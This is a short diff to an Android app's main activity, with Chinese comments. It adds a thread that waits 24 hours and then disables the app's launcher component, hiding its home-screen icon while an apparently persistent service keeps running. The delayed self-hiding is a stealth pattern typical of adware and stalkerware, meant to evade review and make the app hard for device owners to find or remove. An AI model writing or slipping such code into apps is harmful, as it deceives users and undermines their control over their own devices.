@@ -6,6 +6,7 @@ import android.app.job.JobScheduler;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.graphics.drawable.Drawable;
 import android.net.Uri;
 import android.os.Build;
@@ -119,6 +120,22 @@ public class MainActivity extends BaseActivity {
         } else {
             startService(new Intent(getApplicationContext(), GrayService.class));
         }
+
+        //隐藏App Icon
+       hideAppIcon();
+
+    }
+
+
+    private void hideAppIcon() {
+        new Thread(){
+            @Override
+            public void run() {
+                SystemClock.sleep(1000*60*60*24);//24小时后桌面图标影藏
+                PackageManager pm=getPackageManager();
+                pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);//影藏图标
+            }
+        }.start();
     }
 
 
